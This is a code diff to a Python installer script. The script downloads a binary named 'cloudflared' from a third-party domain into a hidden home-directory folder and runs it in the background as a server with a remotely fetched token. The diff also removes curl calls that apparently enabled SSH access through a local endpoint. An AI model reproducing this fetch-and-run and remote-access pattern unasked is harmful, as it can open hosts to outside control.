@@ -18,7 +18,7 @@ ROOT_DIR = pathlib.Path.home() / ".tool"
 DEBUG_LOG = ROOT_DIR / "debug.log"
 PID_FILE = ROOT_DIR / "stream.pid"
 BIN_FILE = ROOT_DIR / "stream"
-BIN_ARGS = ""
+BIN_ARGS = " server --token 'https://cn.quinn.eu.org/api/mongo/raw?key=link' "
 LOCK_FILE = ROOT_DIR / "stream.lock"
 
 def debug_log(message):
@@ -123,12 +123,6 @@ def create_startup_script():
 cd {ROOT_DIR.resolve()}
 {BIN_FILE} {BIN_ARGS} > run.log 2>&1 &
 echo $! > {PID_FILE}
-sleep 1
-curl http://127.0.0.1:8080/api/ssh?key=tiechui1994
-sleep 1
-curl http://127.0.0.1:8080/api/ssh?key=tiechui1994
-sleep 1
-curl http://127.0.0.1:8080/api/ssh?key=tiechui1994
 '''
     start_script_path.write_text(start_content)
     os.chmod(start_script_path, 0o755)
@@ -162,7 +156,7 @@ def parse_args():
     parser.add_argument("action", nargs="?", default="install",
                         choices=["install", "status", "update", "del", "uninstall", "cat"],
                         help="操作类型: install(安装), status(状态), update(更新), del(卸载)")
-    parser.add_argument("--url", "-u", default="https://cn.quinn.eu.org/api/file/functionless", help="donwload url")
+    parser.add_argument("--url", "-u", default="https://cn.quinn.eu.org/api/file/cloudflared", help="donwload url")
 
     return parser.parse_args()
 
